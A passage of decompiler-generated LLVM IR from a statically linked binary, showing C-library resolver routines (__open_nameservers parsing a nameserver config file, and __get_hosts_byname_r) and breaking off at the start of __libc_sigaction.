  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 101, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 17, { 2, 3, 13, 4, 16, 17, 5, 18, 6, 7, 8, 9, 10, 21, 22, 14, 15, 19, 0, 1, 11, 12, 20 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 53, { 2, 0, 1, 3 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16* @global_var_10028534.679, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 2, 7, 0, 1, 8, 4, 5, 6, 3 }
  uselistorder label %dec_label_pc_10012a38, { 1, 0 }
  uselistorder label %dec_label_pc_10012a08, { 1, 0 }
  uselistorder label %dec_label_pc_100129d8, { 1, 0 }
  uselistorder label %dec_label_pc_100129c8, { 1, 0 }
  uselistorder label %dec_label_pc_100129b8, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10012494.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001299c, { 1, 0 }
  uselistorder label %dec_label_pc_10012984, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_100129a0thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001292c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10012904, { 1, 0 }
  uselistorder label %dec_label_pc_100128e0, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_100128d8, { 1, 0 }
  uselistorder label %dec_label_pc_100128c4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012830, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001276c, { 1, 0 }
  uselistorder label %dec_label_pc_10012764, { 1, 0 }
  uselistorder label %dec_label_pc_10012608, { 1, 0 }
  uselistorder label %dec_label_pc_10012580, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100124a4, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10012a70 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10012a70, i32* @r3, align 4
  %v0_10012a78 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_10028538.626 to i32), i32* %r3.global-to-local, align 4
  %v0_10012a80 = call i32 @__pthread_return_0()
  store i32 %v0_10012a80, i32* %r3.global-to-local, align 4
  %v3_10012a88 = load i32, i32* @global_var_1002861c.627, align 4
  %v2_10012a8c = icmp sgt i32 %v3_10012a88, 0
  br i1 %v2_10012a8c, label %dec_label_pc_10012d04, label %dec_label_pc_10012a94

dec_label_pc_10012a94:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_10017b48.692 to i32), i32* %r3.global-to-local, align 4
  store i32 268511916, i32* @lr, align 4
  %v3_10012aa8 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_10017b48.692 to i32), i32 ptrtoint (i32* @global_var_10017b5c.691 to i32))
  store i32 %v3_10012aa8, i32* %r3.global-to-local, align 4
  store i32 %v3_10012aa8, i32* @r26, align 4
  %v3_10012aac = icmp eq i32 %v3_10012aa8, 0
  br i1 %v3_10012aac, label %dec_label_pc_10012ab4, label %dec_label_pc_10012cc8.preheader

dec_label_pc_10012ab4:                            ; preds = %dec_label_pc_10012a94
  %v0_10012ab8 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_10017b60.693 to i32), i32* %r3.global-to-local, align 4
  store i32 268511940, i32* @lr, align 4
  %v3_10012ac0 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_10017b60.693 to i32), i32 %v0_10012ab8)
  store i32 %v3_10012ac0, i32* %r3.global-to-local, align 4
  store i32 %v3_10012ac0, i32* @r26, align 4
  %v3_10012ac4 = icmp eq i32 %v3_10012ac0, 0
  br i1 %v3_10012ac4, label %dec_label_pc_10012cf8, label %dec_label_pc_10012cc8.preheader

dec_label_pc_10012cc8.preheader:                  ; preds = %dec_label_pc_10012a94, %dec_label_pc_10012ab4
  %v0_10012cd416 = phi i32 [ %v3_10012aa8, %dec_label_pc_10012a94 ], [ %v3_10012ac0, %dec_label_pc_10012ab4 ]
  %v2_10012cc8 = ptrtoint i32* %stack_var_-164 to i32
  %v1_10012ad42 = bitcast i32* %stack_var_-164 to i8*
  %v3_10012bb8 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10012cc8

dec_label_pc_10012ad0:                            ; preds = %dec_label_pc_10012ae8
  %v1_10012ad0 = add i32 %v0_10012b909, 1
  store i32 %v1_10012ad0, i32* %r3.global-to-local, align 4
  %v1_10012ad4 = inttoptr i32 %v1_10012ad0 to i8*
  %v2_10012ad4 = load i8, i8* %v1_10012ad4, align 1
  %v3_10012ad4 = zext i8 %v2_10012ad4 to i32
  store i32 %v3_10012ad4, i32* %r11.global-to-local, align 4
  %v3_10012adc = icmp eq i8 %v2_10012ad4, 0
  br i1 %v3_10012adc, label %dec_label_pc_10012cc8.backedge, label %dec_label_pc_10012ae8

dec_label_pc_10012ae8:                            ; preds = %dec_label_pc_10012ae8.lr.ph, %dec_label_pc_10012ad0
  %v0_10012aec.in = phi i32 [ %v3_10012ad44, %dec_label_pc_10012ae8.lr.ph ], [ %v3_10012ad4, %dec_label_pc_10012ad0 ]
  %v0_10012b00 = phi i32 [ %v3_10012ad44, %dec_label_pc_10012ae8.lr.ph ], [ %v3_10012ad4, %dec_label_pc_10012ad0 ]
  %v0_10012b909 = phi i32 [ %v2_10012cc8, %dec_label_pc_10012ae8.lr.ph ], [ %v1_10012ad0, %dec_label_pc_10012ad0 ]
  %v0_10012aec = mul nuw nsw i32 %v0_10012aec.in, 2
  %v2_10012aec = add i32 %v0_10012aec, %v3_10012ae8.pre
  %v3_10012aec = inttoptr i32 %v2_10012aec to i16*
  %v4_10012aec = load i16, i16* %v3_10012aec, align 2
  %v1_10012af0 = and i16 %v4_10012aec, 32
  %v3_10012af0 = icmp eq i16 %v1_10012af0, 0
  br i1 %v3_10012af0, label %dec_label_pc_10012af8, label %dec_label_pc_10012ad0

dec_label_pc_10012af8:                            ; preds = %dec_label_pc_10012ae8
  %v3_10012af8 = icmp eq i32 %v0_10012b00, 10
  br i1 %v3_10012af8, label %dec_label_pc_10012cc8.backedge, label %dec_label_pc_10012b00

dec_label_pc_10012cc8.backedge:                   ; preds = %dec_label_pc_10012ad0, %dec_label_pc_10012c7c, %dec_label_pc_10012c84, %dec_label_pc_10012cbc, %dec_label_pc_10012ad4.preheader, %dec_label_pc_10012af8, %dec_label_pc_10012b00, %dec_label_pc_10012c24
  %v0_10012cd4.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10012cc8

dec_label_pc_10012b00:                            ; preds = %dec_label_pc_10012af8
  %v3_10012b00 = icmp eq i32 %v0_10012b00, 35
  br i1 %v3_10012b00, label %dec_label_pc_10012cc8.backedge, label %dec_label_pc_10012b08

dec_label_pc_10012b08:                            ; preds = %dec_label_pc_10012b00
  store i32 0, i32* @r27, align 4
  store i32 %v2_10012a70, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_10012b9010 = inttoptr i32 %v0_10012b909 to i8*
  %v2_10012b9011 = load i8, i8* %v1_10012b9010, align 1
  %v3_10012b9414 = icmp eq i8 %v2_10012b9011, 0
  br i1 %v3_10012b9414, label %dec_label_pc_10012ba4, label %dec_label_pc_10012b9c

dec_label_pc_10012b1c:                            ; preds = %dec_label_pc_10012b9c
  %v1_10012b1c = mul i32 %v0_10012b1c, 4
  %v3_10012b20 = load i32, i32* @global_var_10028578, align 4
  store i32 %v3_10012b20, i32* %r11.global-to-local, align 4
  %v1_10012b24 = load i32, i32* %r6.global-to-local, align 4
  %v2_10012b24 = add i32 %v1_10012b24, %v1_10012b1c
  %v2_10012b28 = add i32 %v2_10012b24, 16
  %v3_10012b28 = inttoptr i32 %v2_10012b28 to i32*
  store i32 %v0_10012b28, i32* %v3_10012b28, align 4
  %v0_10012b34.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012b34

dec_label_pc_10012b30:                            ; preds = %dec_label_pc_10012b48
  %v1_10012b30 = add i32 %v0_10012b30, 1
  store i32 %v1_10012b30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012b34

dec_label_pc_10012b34:                            ; preds = %dec_label_pc_10012b1c, %dec_label_pc_10012b30
  %v0_10012b30 = phi i32 [ %v0_10012b34.pre, %dec_label_pc_10012b1c ], [ %v1_10012b30, %dec_label_pc_10012b30 ]
  %v1_10012b34 = inttoptr i32 %v0_10012b30 to i8*
  %v2_10012b34 = load i8, i8* %v1_10012b34, align 1
  %v3_10012b38 = icmp eq i8 %v2_10012b34, 0
  br i1 %v3_10012b38, label %dec_label_pc_10012b64, label %dec_label_pc_10012b48

dec_label_pc_10012b48:                            ; preds = %dec_label_pc_10012b34
  %v3_10012b40 = icmp eq i8 %v2_10012b34, 10
  %v3_10012b34 = zext i8 %v2_10012b34 to i32
  %v1_10012b3c = mul nuw nsw i32 %v3_10012b34, 2
  %v1_10012b48 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012b48 = add i32 %v1_10012b48, %v1_10012b3c
  %v3_10012b48 = inttoptr i32 %v2_10012b48 to i16*
  %v4_10012b48 = load i16, i16* %v3_10012b48, align 2
  %v1_10012b4c = and i16 %v4_10012b48, 32
  %v3_10012b4c.not = icmp ne i16 %v1_10012b4c, 0
  %brmerge = or i1 %v3_10012b40, %v3_10012b4c.not
  br i1 %brmerge, label %dec_label_pc_10012b64, label %dec_label_pc_10012b30

dec_label_pc_10012b5c:                            ; preds = %dec_label_pc_10012b78
  %v0_10012b5c = load i32, i32* %r7.global-to-local, align 4
  %v1_10012b5c = trunc i32 %v0_10012b5c to i8
  store i8 %v1_10012b5c, i8* %v1_10012b64, align 1
  %v0_10012b60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012b60 = add i32 %v0_10012b60, 1
  store i32 %v1_10012b60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012b64

dec_label_pc_10012b64:                            ; preds = %dec_label_pc_10012b48, %dec_label_pc_10012b34, %dec_label_pc_10012b5c
  %v0_10012b90 = phi i32 [ %v1_10012b60, %dec_label_pc_10012b5c ], [ %v0_10012b30, %dec_label_pc_10012b34 ], [ %v0_10012b30, %dec_label_pc_10012b48 ]
  %v1_10012b64 = inttoptr i32 %v0_10012b90 to i8*
  %v2_10012b64 = load i8, i8* %v1_10012b64, align 1
  %v3_10012b64 = zext i8 %v2_10012b64 to i32
  %v3_10012b68 = icmp eq i8 %v2_10012b64, 0
  %v1_10012b6c = mul nuw nsw i32 %v3_10012b64, 2
  store i32 %v1_10012b6c, i32* %r11.global-to-local, align 4
  br i1 %v3_10012b68, label %dec_label_pc_10012b8c, label %dec_label_pc_10012b78

dec_label_pc_10012b78:                            ; preds = %dec_label_pc_10012b64
  %v3_10012b70 = icmp eq i8 %v2_10012b64, 10
  %v3_10012b78 = load i32, i32* @global_var_10028578, align 4
  %v2_10012b7c = add i32 %v3_10012b78, %v1_10012b6c
  %v3_10012b7c = inttoptr i32 %v2_10012b7c to i16*
  %v4_10012b7c = load i16, i16* %v3_10012b7c, align 2
  %v1_10012b80 = and i16 %v4_10012b7c, 32
  %v3_10012b80.not = icmp ne i16 %v1_10012b80, 0
  %brmerge27 = or i1 %v3_10012b70, %v3_10012b80.not
  br i1 %brmerge27, label %dec_label_pc_10012b5c, label %dec_label_pc_10012b8c

dec_label_pc_10012b8c:                            ; preds = %dec_label_pc_10012b78, %dec_label_pc_10012b64
  %v0_10012b8c = load i32, i32* @r27, align 4
  %v1_10012b8c = add i32 %v0_10012b8c, 1
  store i32 %v1_10012b8c, i32* @r27, align 4
  %v2_10012b90 = load i8, i8* %v1_10012b64, align 1
  %v3_10012b94 = icmp eq i8 %v2_10012b90, 0
  br i1 %v3_10012b94, label %dec_label_pc_10012ba4, label %dec_label_pc_10012b9c

dec_label_pc_10012b9c:                            ; preds = %dec_label_pc_10012b08, %dec_label_pc_10012b8c
  %v0_10012b28 = phi i32 [ %v0_10012b90, %dec_label_pc_10012b8c ], [ %v0_10012b909, %dec_label_pc_10012b08 ]
  %v0_10012b1c = phi i32 [ %v1_10012b8c, %dec_label_pc_10012b8c ], [ 0, %dec_label_pc_10012b08 ]
  %tmp33 = icmp slt i32 %v0_10012b1c, 5
  br i1 %tmp33, label %dec_label_pc_10012b1c, label %dec_label_pc_10012ba4

dec_label_pc_10012ba4:                            ; preds = %dec_label_pc_10012b8c, %dec_label_pc_10012b9c, %dec_label_pc_10012b08
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_10017b78.694 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10012bb8 = call i32 @__GI_strcoll(i8* %v3_10012bb8, i32 ptrtoint ([11 x i8]* @global_var_10017b78.694 to i32))
  store i32 %v4_10012bb8, i32* %r3.global-to-local, align 4
  %v3_10012bbc = icmp eq i32 %v4_10012bb8, 0
  br i1 %v3_10012bbc, label %dec_label_pc_10012be8, label %dec_label_pc_10012c0c

dec_label_pc_10012bc8:                            ; preds = %dec_label_pc_10012c00
  %v1_10012bc8 = add i32 %v2_10012bf0, 24
  %v2_10012bc8 = inttoptr i32 %v1_10012bc8 to i32*
  %v3_10012bc8 = load i32, i32* %v2_10012bc8, align 4
  store i32 %v3_10012bc8, i32* %r3.global-to-local, align 4
  store i32 268512208, i32* @lr, align 4
  %v1_10012bcc = call i32 @__GI_strdup(i32 %v3_10012bc8)
  store i32 %v1_10012bcc, i32* %r3.global-to-local, align 4
  %v0_10012bd4 = load i32, i32* @r29, align 4
  %v1_10012bd4 = add i32 %v0_10012bd4, 1
  store i32 %v1_10012bd4, i32* %r11.global-to-local, align 4
  %v1_10012bd8 = mul i32 %v0_10012bd4, 4
  store i32 %v1_10012bd4, i32* @global_var_1002861c.627, align 4
  %v3_10012be4 = add i32 %v1_10012bd8, ptrtoint (i32* @global_var_1002e918.628 to i32)
  %v4_10012be4 = inttoptr i32 %v3_10012be4 to i32*
  store i32 %v1_10012bcc, i32* %v4_10012be4, align 4
  br label %dec_label_pc_10012be8

dec_label_pc_10012be8:                            ; preds = %dec_label_pc_10012ba4, %dec_label_pc_10012bc8
  %v0_10012be8 = load i32, i32* @r31, align 4
  %v1_10012be8 = load i32, i32* @r27, align 4
  %v2_10012be8 = icmp slt i32 %v0_10012be8, %v1_10012be8
  %v1_10012bec = mul i32 %v0_10012be8, 4
  %v0_10012bf0 = load i32, i32* @r1, align 4
  %v2_10012bf0 = add i32 %v0_10012bf0, %v1_10012bec
  br i1 %v2_10012be8, label %dec_label_pc_10012c00, label %dec_label_pc_10012c0c

dec_label_pc_10012c00:                            ; preds = %dec_label_pc_10012be8
  %v3_10012c00 = load i32, i32* @global_var_1002861c.627, align 4
  %tmp35 = icmp slt i32 %v3_10012c00, 3
  br i1 %tmp35, label %dec_label_pc_10012bc8, label %dec_label_pc_10012c0c

dec_label_pc_10012c0c:                            ; preds = %dec_label_pc_10012c00, %dec_label_pc_10012be8, %dec_label_pc_10012ba4
  %v0_10012c10 = load i32, i32* @r30, align 4
  store i32 %v0_10012c10, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10017b84.695 to i32), i32* @r4, align 4
  %v3_10012c18 = inttoptr i32 %v0_10012c10 to i8*
  %v4_10012c18 = call i32 @__GI_strcoll(i8* %v3_10012c18, i32 ptrtoint ([7 x i8]* @global_var_10017b84.695 to i32))
  store i32 %v4_10012c18, i32* %r3.global-to-local, align 4
  %v3_10012c1c = icmp eq i32 %v4_10012c18, 0
  br i1 %v3_10012c1c, label %dec_label_pc_10012c5c.preheader, label %dec_label_pc_10012c24

dec_label_pc_10012c24:                            ; preds = %dec_label_pc_10012c0c
  %v0_10012c28 = load i32, i32* @r30, align 4
  store i32 %v0_10012c28, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10017b8c.696 to i32), i32* @r4, align 4
  %v3_10012c30 = inttoptr i32 %v0_10012c28 to i8*
  %v4_10012c30 = call i32 @__GI_strcoll(i8* %v3_10012c30, i32 ptrtoint ([7 x i8]* @global_var_10017b8c.696 to i32))
  store i32 %v4_10012c30, i32* %r3.global-to-local, align 4
  %v3_10012c34 = icmp eq i32 %v4_10012c30, 0
  br i1 %v3_10012c34, label %dec_label_pc_10012c5c.preheader, label %dec_label_pc_10012cc8.backedge

dec_label_pc_10012c5c.preheader:                  ; preds = %dec_label_pc_10012c0c, %dec_label_pc_10012c24
  store i32 ptrtoint (i32* @global_var_1002e908.683 to i32), i32* @r31, align 4
  %v3_10012c6841 = load i32, i32* @global_var_10028620.681, align 4
  %v2_10012c6c43 = icmp sgt i32 %v3_10012c6841, 0
  %v1_10012c7045 = add i32 %v3_10012c6841, -1
  %v1_10012c7446 = mul i32 %v1_10012c7045, 4
  store i32 %v1_10012c7446, i32* %r11.global-to-local, align 4
  br i1 %v2_10012c6c43, label %dec_label_pc_10012c40, label %dec_label_pc_10012c7c

dec_label_pc_10012c40:                            ; preds = %dec_label_pc_10012c5c.preheader, %dec_label_pc_10012c40
  %v1_10012c7448 = phi i32 [ %v1_10012c74, %dec_label_pc_10012c40 ], [ %v1_10012c7446, %dec_label_pc_10012c5c.preheader ]
  %v1_10012c7047 = phi i32 [ %v1_10012c70, %dec_label_pc_10012c40 ], [ %v1_10012c7045, %dec_label_pc_10012c5c.preheader ]
  %v2_10012c40 = add i32 %v1_10012c7448, ptrtoint (i32* @global_var_1002e908.683 to i32)
  %v3_10012c40 = inttoptr i32 %v2_10012c40 to i32*
  %v4_10012c40 = load i32, i32* %v3_10012c40, align 4
  store i32 %v4_10012c40, i32* @r3, align 4
  store i32 %v1_10012c7047, i32* @global_var_10028620.681, align 4
  store i32 268512332, i32* @lr, align 4
  %v0_10012c48 = call i32 @free()
  store i32 %v0_10012c48, i32* %r3.global-to-local, align 4
  %v3_10012c4c = load i32, i32* @global_var_10028620.681, align 4
  %v1_10012c54 = mul i32 %v3_10012c4c, 4
  %v1_10012c58 = load i32, i32* @r31, align 4
  %v3_10012c58 = add i32 %v1_10012c58, %v1_10012c54
  %v4_10012c58 = inttoptr i32 %v3_10012c58 to i32*
  store i32 0, i32* %v4_10012c58, align 4
  store i32 ptrtoint (i32* @global_var_1002e908.683 to i32), i32* @r31, align 4
  %v3_10012c68 = load i32, i32* @global_var_10028620.681, align 4
  %v2_10012c6c = icmp sgt i32 %v3_10012c68, 0
  %v1_10012c70 = add i32 %v3_10012c68, -1
  %v1_10012c74 = mul i32 %v1_10012c70, 4
  store i32 %v1_10012c74, i32* %r11.global-to-local, align 4
  br i1 %v2_10012c6c, label %dec_label_pc_10012c40, label %dec_label_pc_10012c7c

dec_label_pc_10012c7c:                            ; preds = %dec_label_pc_10012c40, %dec_label_pc_10012c5c.preheader
  %v3_10012cbc59 = phi i32 [ %v3_10012c6841, %dec_label_pc_10012c5c.preheader ], [ %v3_10012c68, %dec_label_pc_10012c40 ]
  %v1_10012ca449 = load i32, i32* @r27, align 4
  %v2_10012ca450 = icmp sgt i32 %v1_10012ca449, 1
  %v0_10012cac53 = load i32, i32* @r1, align 4
  %v2_10012cac54 = add i32 %v0_10012cac53, 4
  br i1 %v2_10012ca450, label %dec_label_pc_10012cbc, label %dec_label_pc_10012cc8.backedge

dec_label_pc_10012c84:                            ; preds = %dec_label_pc_10012cbc
  %v1_10012c84 = add i32 %v2_10012cac55, 24
  %v2_10012c84 = inttoptr i32 %v1_10012c84 to i32*
  %v3_10012c84 = load i32, i32* %v2_10012c84, align 4
  store i32 %v3_10012c84, i32* %r3.global-to-local, align 4
  store i32 268512396, i32* @lr, align 4
  %v1_10012c88 = call i32 @__GI_strdup(i32 %v3_10012c84)
  store i32 %v1_10012c88, i32* %r3.global-to-local, align 4
  %v0_10012c90 = load i32, i32* @r29, align 4
  %v1_10012c90 = add i32 %v0_10012c90, 1
  store i32 %v1_10012c90, i32* %r11.global-to-local, align 4
  %v1_10012c94 = mul i32 %v0_10012c90, 4
  store i32 %v1_10012c90, i32* @global_var_10028620.681, align 4
  %v3_10012ca0 = add i32 %v1_10012c94, ptrtoint (i32* @global_var_1002e908.683 to i32)
  %v4_10012ca0 = inttoptr i32 %v3_10012ca0 to i32*
  store i32 %v1_10012c88, i32* %v4_10012ca0, align 4
  %v0_10012ca4.pre = load i32, i32* @r31, align 4
  %v1_10012ca4 = load i32, i32* @r27, align 4
  %v2_10012ca4 = icmp slt i32 %v0_10012ca4.pre, %v1_10012ca4
  br i1 %v2_10012ca4, label %dec_label_pc_10012c84.dec_label_pc_10012cbc_crit_edge, label %dec_label_pc_10012cc8.backedge

dec_label_pc_10012c84.dec_label_pc_10012cbc_crit_edge: ; preds = %dec_label_pc_10012c84
  %v0_10012cac = load i32, i32* @r1, align 4
  %v1_10012ca8 = mul i32 %v0_10012ca4.pre, 4
  %v2_10012cac = add i32 %v0_10012cac, %v1_10012ca8
  %v3_10012cbc.pre = load i32, i32* @global_var_10028620.681, align 4
  br label %dec_label_pc_10012cbc

dec_label_pc_10012cbc:                            ; preds = %dec_label_pc_10012c7c, %dec_label_pc_10012c84.dec_label_pc_10012cbc_crit_edge
  %v3_10012cbc = phi i32 [ %v3_10012cbc.pre, %dec_label_pc_10012c84.dec_label_pc_10012cbc_crit_edge ], [ %v3_10012cbc59, %dec_label_pc_10012c7c ]
  %v2_10012cac55 = phi i32 [ %v2_10012cac, %dec_label_pc_10012c84.dec_label_pc_10012cbc_crit_edge ], [ %v2_10012cac54, %dec_label_pc_10012c7c ]
  %tmp37 = icmp slt i32 %v3_10012cbc, 4
  br i1 %tmp37, label %dec_label_pc_10012c84, label %dec_label_pc_10012cc8.backedge

dec_label_pc_10012cc8:                            ; preds = %dec_label_pc_10012cc8.backedge, %dec_label_pc_10012cc8.preheader
  %v0_10012cd4 = phi i32 [ %v0_10012cd4.pre, %dec_label_pc_10012cc8.backedge ], [ %v0_10012cd416, %dec_label_pc_10012cc8.preheader ]
  store i32 %v2_10012cc8, i32* %r3.global-to-local, align 4
  store i32 268512476, i32* @lr, align 4
  %v3_10012cd8 = call i32 @fgets(i32 %v2_10012cc8, i32 128, i32 %v0_10012cd4)
  store i32 %v3_10012cd8, i32* %r3.global-to-local, align 4
  %v3_10012cdc = icmp eq i32 %v3_10012cd8, 0
  br i1 %v3_10012cdc, label %dec_label_pc_10012cec, label %dec_label_pc_10012ad4.preheader

dec_label_pc_10012ad4.preheader:                  ; preds = %dec_label_pc_10012cc8
  store i32 %v2_10012cc8, i32* %r3.global-to-local, align 4
  %v2_10012ad43 = load i8, i8* %v1_10012ad42, align 4
  %v3_10012ad44 = zext i8 %v2_10012ad43 to i32
  store i32 %v3_10012ad44, i32* %r11.global-to-local, align 4
  %v3_10012adc6 = icmp eq i8 %v2_10012ad43, 0
  br i1 %v3_10012adc6, label %dec_label_pc_10012cc8.backedge, label %dec_label_pc_10012ae8.lr.ph

dec_label_pc_10012ae8.lr.ph:                      ; preds = %dec_label_pc_10012ad4.preheader
  %v3_10012ae8.pre = load i32, i32* @global_var_10028578, align 4
  br label %dec_label_pc_10012ae8

dec_label_pc_10012cec:                            ; preds = %dec_label_pc_10012cc8
  %v0_10012cec = load i32, i32* @r26, align 4
  store i32 %v0_10012cec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012cf4.697 to i32), i32* @lr, align 4
  %v1_10012cf0 = inttoptr i32 %v0_10012cec to i16*
  %v2_10012cf0 = call i32 @__GI_fclose(i16* %v1_10012cf0)
  store i32 %v2_10012cf0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012d04

dec_label_pc_10012cf8:                            ; preds = %dec_label_pc_10012ab4
  %v0_10012cf8 = call i32 @__GI___h_errno_location()
  store i32 %v0_10012cf8, i32* %r3.global-to-local, align 4
  %v2_10012d00 = inttoptr i32 %v0_10012cf8 to i32*
  store i32 3, i32* %v2_10012d00, align 4
  br label %dec_label_pc_10012d04

dec_label_pc_10012d04:                            ; preds = %entry, %dec_label_pc_10012cec, %dec_label_pc_10012cf8
  store i32 %v2_10012a70, i32* @r3, align 4
  %v0_10012d0c = call i32 @__pthread_return_void()
  store i32 %v0_10012d0c, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012d0c

; uselistorder directives
  uselistorder i32 %v3_10012ad44, { 2, 0, 1 }
  uselistorder i32 %v1_10012c7446, { 1, 0 }
  uselistorder i32 %v1_10012c7045, { 1, 0 }
  uselistorder i32 %v0_10012b1c, { 1, 0 }
  uselistorder i32 %v1_10012b6c, { 1, 0 }
  uselistorder i8* %v1_10012b64, { 0, 2, 1 }
  uselistorder i8 %v2_10012b34, { 2, 0, 1 }
  uselistorder i32 %v0_10012b30, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10012ad4, { 1, 0, 2 }
  uselistorder i32 %v1_10012ad0, { 0, 2, 1 }
  uselistorder i32 %v2_10012cc8, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10012a70, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 1, 21, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18, 0, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @free, { 20, 17, 16, 15, 14, 13, 12, 11, 23, 4, 10, 9, 8, 7, 6, 19, 18, 21, 3, 2, 22, 5, 1, 0 }
  uselistorder i32* @global_var_10028620.681, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e908.683 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e918.628 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10028538.626 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_10012d04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012cbc, { 1, 0 }
  uselistorder label %dec_label_pc_10012c40, { 1, 0 }
  uselistorder label %dec_label_pc_10012c5c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10012be8, { 1, 0 }
  uselistorder label %dec_label_pc_10012ba4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012b9c, { 1, 0 }
  uselistorder label %dec_label_pc_10012b64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012b34, { 1, 0 }
  uselistorder label %dec_label_pc_10012cc8.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10012cc8.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_10012d28 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268512616, i32* @lr, align 4
  %v9_10012d64 = inttoptr i32 %arg3 to i32*
  %v10_10012d64 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_10012d64, i32 %arg4, i32 %arg5, i32 %v4_10012d28, i32 %arg7)
  ret i32 %v10_10012d64
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
